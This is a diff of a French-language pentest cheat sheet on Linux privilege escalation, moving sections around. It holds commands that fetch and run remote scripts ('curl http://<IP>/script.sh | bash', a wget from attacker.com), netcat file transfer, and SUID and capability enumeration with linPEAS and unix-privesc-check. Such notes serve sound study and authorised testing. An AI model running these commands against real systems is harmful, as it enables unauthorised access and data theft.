@@ -1,28 +1,8 @@
 # Linux
 
-## OLD
-### Stratégie
-
-* Version de Linux -> exploit ?
-* Historique utilisateur, bashrc, bash history, variable ENV
-* Cron qui tournent avec des scripts sur lesquels on a des droits en écriture
-* Recherche d'exploits avec des binaires : GTFOBins
-* `sudo -l` pour voir ce que tu peux exec en root -> GTFOBins
-* `find / -perm -u=s -type f 2>/dev/null` -> GTFOBins
-
-### Outils
-
-* [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
-* [GTFOBins](https://gtfobins.github.io/)
-
-### Commandes
+### Commandes (OLD)
 
 ```bash
-# linpeas.sh
-wget http://attacker.com/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-
 id
 sudo -l
 crontab -l
@@ -33,16 +13,35 @@ getcap -r / 2>/dev/null
 ps aux
 ss -tln
 netstat -taupen
+```
 
+## Commandes utiles
+
+**Transfert de fichiers avec nc**
+
+```bash
+# On your receiver:
+nc -l -p 4444 -q 1 > something.zip < /dev/null
+
+# On your sender:
+cat something.zip | netcat <IP> 4444
+```
+
+**Exécuter un script Bash**
+
+```bash
+cat script.sh | bash
+curl http://<IP>/script.sh | bash
+```
+
+**Trouver des fichiers avec permissions spéciales**
+
+```bash
 # regarder les binaires liés à un group
-find / -group bugtracker 2>/dev/null
+find / -group <GROUP> 2>/dev/null
 
 # infos sur un fichier (looking for setuid, suid)
-ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-
-# Exécuter un script Bash
-cat script.sh | bash
-curl http://<ip>/script.sh | bash
+ls -la <FILE_PATH> && file <FILE_PATH>
 ```
 
 ## Enumerating Linux
@@ -173,34 +172,9 @@ strings /usr/bin/passwd_flag
 
 ### Enumération automatique
 
-#### Transfert de fichiers avec nc
+**linPEAS**
 
-```bash
-# On your receiver:
-
-nc -l -p 1234 -q 1 > something.zip < /dev/null
-
-# On your sender:
-
-cat something.zip | netcat server.ip.here 1234
-
-```
-
-#### unix-privesc-check
-
-Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.
-
-```bash
-# Standard : rapide, peu de faux positifs
-./unix-privesc-check standard > output.txt
-
-# Detailed : vérifie aussi les file handles ouverts et les fichiers appelés par les scripts
-./unix-privesc-check detailed > output.txt
-```
-
-Chercher les lignes `WARNING` dans l'output - elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).
-
-#### linPEAS
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
 ```bash
 # Kali : servir
@@ -215,6 +189,20 @@ curl http://<ip>/linpeas.sh | bash
 wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ./linpeas.sh > output.txt
 ```
+
+**unix-privesc-check**
+
+Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.
+
+```bash
+# Standard : rapide, peu de faux positifs
+./unix-privesc-check standard > output.txt
+
+# Detailed : vérifie aussi les file handles ouverts et les fichiers appelés par les scripts
+./unix-privesc-check detailed > output.txt
+```
+
+Chercher les lignes `WARNING` dans l'output - elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).
 
 ## Exposed confidential information
 
